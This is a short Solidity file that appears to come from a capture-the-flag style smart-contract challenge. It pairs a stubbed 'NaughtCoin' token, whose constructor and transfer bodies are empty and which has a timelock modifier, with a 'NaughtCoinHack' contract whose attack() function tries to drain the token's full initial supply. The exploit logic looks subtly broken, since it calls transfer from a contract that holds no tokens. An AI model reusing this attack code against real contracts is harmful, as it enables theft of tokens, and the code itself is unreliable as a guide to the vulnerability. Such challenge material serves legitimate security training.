pragma solidity ^0.4.18;

import 'zeppelin/contracts/token/StandardToken.sol';

 contract NaughtCoin is StandardToken {
     
  uint public INITIAL_SUPPLY;
  address public player;
  uint public timeLock = now + 10 years;
  
  function NaughtCoin(address _player) public {
  }
  
  function transfer(address _to, uint256 _value) lockTokens public returns(bool) {
  }

  // Prevent the initial owner from transferring tokens until the timelock has passed
  modifier lockTokens() {
    if (msg.sender == player) {
      require(now > timeLock);
      _;
    } else {
     _;
    }
  } 
} 

contract NaughtCoinHack{
    function NaughtCoinHack() public {
   
    }
    
    function attack(address _inst) public payable {
        NaughtCoin tar = NaughtCoin(_inst);
        uint balance = tar.INITIAL_SUPPLY();
        tar.transfer(msg.sender, balance);
    }
}